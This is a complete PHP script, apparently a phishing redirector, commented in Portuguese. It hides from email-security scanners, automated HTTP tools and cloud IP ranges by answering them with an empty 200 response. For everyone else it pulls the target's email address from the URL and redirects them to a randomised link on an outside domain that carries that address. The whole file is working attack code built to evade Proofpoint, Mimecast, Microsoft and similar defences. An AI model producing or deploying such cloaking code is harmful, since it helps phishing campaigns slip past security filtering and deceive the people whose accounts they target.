<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Bots por User-Agent
$bot_agents = [
    'Microsoft Office', 'msnbot', 'Outlook-iOS',
    'Google-Safety', 'Barracuda', 'Proofpoint',
    'Mimecast', 'Sophos', 'Symantec',
    'Mozilla/4.0 (compatible;)', // UA genérico de scanners
    'curl', 'python-requests', 'Go-http-client',
    'Wget', 'libwww-perl'
];

foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(200);
        exit;
    }
}

// Bots por IP range (AWS, Azure, Google que fazem scanning)
$bot_ip_ranges = [
    '54.', '52.', '34.', '35.',   // AWS/GCP comuns
    '40.82.', '40.94.',            // Microsoft
    '185.220.',                     // Scanners conhecidos
];

foreach ($bot_ip_ranges as $range) {
    if (strpos($ip, $range) === 0) {
        http_response_code(200);
        exit;
    }
}

// Extrai email da URL
$requestUri = $_SERVER['REQUEST_URI'];
$email = '';
if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
    $email = $matches[1];
}

if (empty($email)) {
    http_response_code(404);
    exit;
}

$baseUrl = 'https://www.okieweb.com/';

// Gerador mais seguro
function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $result;
}

$urls = [
    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
];

$randomUrl = $urls[array_rand($urls)];
header("Location: " . $randomUrl, true, 302);
exit();
?>
